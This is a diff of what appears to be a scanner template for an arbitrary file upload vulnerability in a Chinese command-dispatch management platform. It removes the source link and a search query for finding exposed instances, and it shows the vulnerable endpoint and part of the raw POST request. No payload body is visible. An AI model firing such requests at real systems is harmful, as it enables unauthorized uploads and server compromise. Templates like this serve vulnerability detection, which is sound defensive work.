@@ -3,12 +3,8 @@ info:
   name: 指挥调度管理平台upload_all任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lx4x2g0rnx9teerv'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lx4x2g0rnx9teerv
-    fofa: body="指挥调度管理平台"
 http:
 - raw:
   - 'POST /api/yl_client/gps_location/upload_all.php HTTP/1.1
@@ -36,7 +32,6 @@ http:
     Cookie:
 
     Sec-Fetch-Site: cross-site
-
 
 
     ------WebKitFormBoundaryo4PcEwYJ2kc2XBYv
